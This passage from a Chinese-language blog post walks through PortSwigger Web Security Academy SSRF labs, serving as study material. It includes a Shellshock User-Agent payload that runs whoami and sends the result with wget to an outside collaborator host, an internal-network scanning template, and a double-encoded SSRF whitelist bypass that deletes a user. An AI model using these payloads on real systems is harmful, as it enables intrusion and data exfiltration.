+<p>基于 Referer 来进行内网扫描探测，同时利用 Shellshock payload 提取信息。解这道题需要对 Shellshock 漏洞（CVE-2014-6271）有一定的了解，可以 Google 相关信息，如 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/english/48112-the-shellshock-attack-%5Bpaper%5D.pdf">48112-the-shellshock-attack-paper.pdf</a>。</p>
+<p>访问商品详情页面，替换 Referer 为 Burp Collaborator 地址：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/product?productId=1</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a1c0042035227f882b6bf8400aa006f.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=izZ6FQpo8wsYac7XksTr3UBNek1ym4M1</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;105&quot;, &quot;Not)A;Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://k5qag4z6qr8te0uio20otc46pxvoje73.oastify.com/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
+
+<p>观察 Burp Collaborator 的情况：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>k5qag4z6qr8te0uio20otc46pxvoje73.oastify.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，<code>User-Agent</code> 字段是完全一样的，可以考虑基于 <code>User-Agent</code> 来发起 Shellshock 攻击，Burp Intruder 模板如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/product?productId=1</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a1c0042035227f882b6bf8400aa006f.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=izZ6FQpo8wsYac7XksTr3UBNek1ym4M1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.§0§:8080/</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>() &#123; :;&#125;; wget http://k5qag4z6qr8te0uio20otc46pxvoje73.oastify.com/$(whoami)</span><br></pre></td></tr></table></figure>
+
+<p>注意，<code>$(whoami)</code> 和反引号都可以，但是 <code>$&#123;whoami&#125;</code> 不可以，前者表示执行命令并引用输出，后者表示引用一个名为 <code>whoami</code> 的变量。</p>
+<p>Burp Collaborator 收到的请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/peter-gbtAyQ</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Wget/1.20.3 (linux-gnu)</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>identity</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>k5qag4z6qr8te0uio20otc46pxvoje73.oastify.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-7-Lab-SSRF-with-whitelist-based-input-filter"><a href="#2-7-Lab-SSRF-with-whitelist-based-input-filter" class="headerlink" title="2.7 Lab: SSRF with whitelist-based input filter"></a>2.7 Lab: SSRF with whitelist-based input filter</h3><blockquote>
+<p>This lab has a stock check feature which fetches data from an internal system.</p>
+<p>To solve the lab, change the stock check URL to access the admin interface at <code>http://localhost/admin</code> and delete the user <code>carlos</code>.</p>
+<p>The developer has deployed an anti-SSRF defense you will need to bypass.</p>
+</blockquote>
+<p>需要绕过 SSRF 白名单，正常的请求如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1%26storeId=1</span><br></pre></td></tr></table></figure>
+
+<p>尝试访问目标地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockApi=http://localhost/admin</span><br></pre></td></tr></table></figure>
+
+<p>提示：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">400</span> Bad Request</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>58</span><br><span class="line"></span><br><span class="line"><span class="language-smalltalk"><span class="comment">&quot;External stock check host must be stock.weliketoshop.net&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>尝试 <code>http://stock.weliketoshop.net:pwd@localhost/admin</code> 无法绕过，尝试 XSS 发现有特殊字符检测：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;Invalid external stock check url &#x27;Illegal character in query at index 75: </span><br><span class="line">http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=&lt;script&gt;&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>参考官方解法：</p>
+<ol>
+<li>访问 <code>stockApi=http://user@stock.weliketoshop.net:8080/</code> 提示 <code>&quot;Missing parameter&quot;</code>，说明支持携带访问凭据</li>
+<li>尝试 <code>http://user#@stock.weliketoshop.net:8080/</code>，尝试把后面部分当成书签，看看服务端是否解析错误，实际上提示 Host 不在白名单</li>
+<li>尝试对 <code>#</code> 进行编码，即 <code>http://user%23@stock.weliketoshop.net:8080/</code>，依然不在白名单</li>
+<li>尝试双重编码，即 <code>stockApi=http://user%2523@stock.weliketoshop.net:8080/</code>，提示 <code>Internal Server Error</code> 和 <code>Could not connect to external stock check service</code>，说明成功绕过了检查逻辑</li>
+</ol>
+<p>猜测服务端首先会进行 URL Decode，所以 <code>http://user%2523@stock.weliketoshop.net:8080/</code> 先解码为 <code>http://user%23@stock.weliketoshop.net:8080/</code>，然后访问该 URL，这个显然也是一个合法的 URL，<code>%23</code> 会自动解码为 <code>#</code>。因此，核心逻辑是服务端会主动进行一次 URL Decode，因此双重编码才可以实现绕过操作。</p>
+<p>发送如下 Payload 即可完成解题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos</span><br></pre></td></tr></table></figure>
+
+<p><strong>黑人问号</strong>：<code>#</code> 居然还可以用在 Host 里面？把 Host 中 <code>#</code> 开始到 <code>/</code> 之前的部分屏蔽掉？看起来不太合理。</p>
+<p>在 Chrome 中访问 <code>https://secdroid.github.io#@google.com/about</code>，实际上也只能访问博客首页，路径部分并不会生效，因为 <code>#</code> 之后都是书签内容。</p>
+<p>Google 搜索了一下，发现有人有同样的疑问，参考 <a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/226714/why-does-portswiggers-solution-to-the-lab-ssrf-with-whitelist-based-input-filt">Why does Portswigger’s solution to the lab “SSRF with whitelist-based input filter” work? - Information Security Stack Exchange</a></p>
+<blockquote>
+<p>I enumerated all the characters and discovered that %252f and %253f also work which are &#x2F; and ? respectively. I tried <code>http://localhost%252fadmin%2523@stock.weliketoshop.net</code> which still passes the filter and makes more sense but again the result was that everything after %25 was stripped so it goes to <code>http://localhost</code> only.</p>
+<p>My conclusion is that Portswigger created a custom filter for the sake of the tutorial which doesn’t exactly resemble a real-world SSRF filter.</p>
+</blockquote>
+<p>看起来后台使用了自定义的 URL 分割逻辑（一方面引入了漏洞，另一方强行拼接了 Path 部分）。</p>
+<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03. 小结"></a>0x03. 小结</h2><ul>
+<li>SSRF 基本概念及利用方式</li>
+<li>SSRF 配合 Burp Intruder 探测内网信息</li>
+<li>SSRF 拦截绕过（多测试不同的形式，判断检查点是什么）</li>
+<li>Shellshock 漏洞原理及利用</li>
+<li>URL 双重解码绕过白名单校验</li>
+</ul>
+<h2 id="0x04-参考文档"><a href="#0x04-参考文档" class="headerlink" title="0x04. 参考文档"></a>0x04. 参考文档</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf">https://portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/english/48112-the-shellshock-attack-%5Bpaper%5D.pdf">https://www.exploit-db.com/docs/english/48112-the-shellshock-attack-%5Bpaper%5D.pdf</a></li>
+<li><a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/226714/why-does-portswiggers-solution-to-the-lab-ssrf-with-whitelist-based-input-filt">https://security.stackexchange.com/questions/226714/why-does-portswiggers-solution-to-the-lab-ssrf-with-whitelist-based-input-filt</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SSRF/" rel="tag"># SSRF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/02/16/burp-web-academy-cors-cross-origin-resource-sharing/" rel="prev" title="Burp Web Academy CORS 跨域资源共享">
+                  <i class="fa fa-angle-left"></i> Burp Web Academy CORS 跨域资源共享
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Livermore</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
